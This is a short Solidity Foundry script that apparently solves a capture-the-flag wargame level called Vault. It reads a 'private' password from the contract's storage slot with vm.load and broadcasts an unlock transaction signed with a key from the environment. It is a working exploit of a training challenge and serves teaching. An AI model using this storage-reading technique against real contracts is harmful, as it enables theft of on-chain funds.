pragma solidity ^0.8.0;
import "../instances/Ilevel08.sol";
import "forge-std/Test.sol";

contract Level08 is Test {
    Vault level08 = Vault(0x45EebFc1adC375c589873aa2dd3CFcFe195e2AF5);

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPrivateKey);
        bytes32 password = vm.load(address(level08), bytes32(uint256(1)));
        level08.unlock(password);
        require(level08.locked() == false, "locked not false");
        vm.stopBroadcast();
    }
}
